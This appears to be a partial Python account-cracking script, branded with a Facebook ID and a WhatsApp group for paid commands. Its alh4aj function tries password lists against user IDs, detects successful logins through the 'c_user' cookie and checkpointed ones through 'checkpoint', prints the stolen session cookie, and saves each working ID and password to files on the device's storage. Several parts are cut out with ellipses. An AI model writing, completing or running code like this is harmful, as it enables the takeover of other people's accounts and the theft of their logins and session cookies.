...
# WHATSAPP GROUP : SALMAN PAID COMMAND
# FB ID :  @SALMAN VAI
...
# LOGO
logo = ("""
\033[31;1m  _____         _      __  __          _   _ 
\033[31;1m / ____|  /\   | |    |  \/  |   /\   | \ | |
\033[31;1m | (___   /  \  | |    | \  / |  /  \  |  \| |
\033[31;1m  \___ \ / /\ \ | |    | |\/| | / /\ \ | . ` |
\033[31;1m  ____) / ____ \| |____| |  | |/ ____ \| |\  |
\033[31;1m |_____/_/    \_\______|_|  |_/_/    \_\_| \_|
""")
# MAIN MANU 
def Main():
        os.system("clear")
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😈] OK SALMAN-VAI-OK.txt')
    print(' [😈] CP SALMAN-VAI-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[DNC-SALMAN-KING]\033[1;36m😈[%s/%s]🥴\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # =[ UA = PRO ]= #
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mSALMAN-CRACK-OK 😈\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😈] COOKIE :\033[1;95m {coki}")
                open('/sdcard/SALMAN-VAI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mSALMAN-VAI-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/SALMAN-VAI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
